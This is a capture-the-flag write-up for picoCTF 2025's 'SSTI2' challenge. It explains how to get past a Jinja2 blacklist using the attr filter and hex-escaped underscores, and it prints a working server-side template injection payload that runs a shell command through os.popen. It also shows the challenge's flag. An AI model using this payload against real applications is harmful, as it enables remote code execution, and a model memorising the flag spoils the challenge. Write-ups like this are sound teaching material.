---
title: "picoCTF 2025: SSTI2"
tags:
  - ctf
date: 2025-03-17
---
# Problem
![[media/ctf/picoCTF/SSTI2/description.png]]
# Solution
Following the same idea as [[SSTI1]], let's start by identifying the template engine in use. Running the same preliminary tests as before allow us to identify that Jinja2 is still being used.

The payloads using magic methods are blacklisted so we'll have to work around that:

![[blacklist.png]]

By trying different combinations of inputs, I discovered that Pythonic attribute access (dot notation (`.`), subscript syntax (`[]`), `getattr`, etc.) and underscores are blacklisted. That makes up the entirety of our previous payload so we need some way to get around that.

Let's start with attribute access. Did you know that Jinja provides [filters](https://jinja.palletsprojects.com/en/stable/templates/#list-of-builtin-filters)? They work the same as most Python built-ins, but use a different syntax. For example, instead of `foo.bar`, you can use `foo|attr('bar')`. That's handy. Note, however, that [Jinja's attr filter only looks up attributes](https://jinja.palletsprojects.com/en/stable/templates/#notes-on-subscriptions), not items. In the case of `__builtins__` and `__import__`, we have to use the `__getitem__` built-in.

Next, for underscores. Did you know that Python interprets bytestrings for us? For instance, the strings `"\x74\x65\x73\x74"` and `"test"` are treated identically:

![[python_strings.png]]

So we can do the same for underscores by replacing them with their bytestring equivalent: `\x5f`.

Updating our previous payload, we're left with the following:
  
```  
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}  
```  

This bypasses the blacklist and gets us the flag once more!
## Flag
`picoCTF{sst1_f1lt3r_byp4ss_7c3c6e7f}`
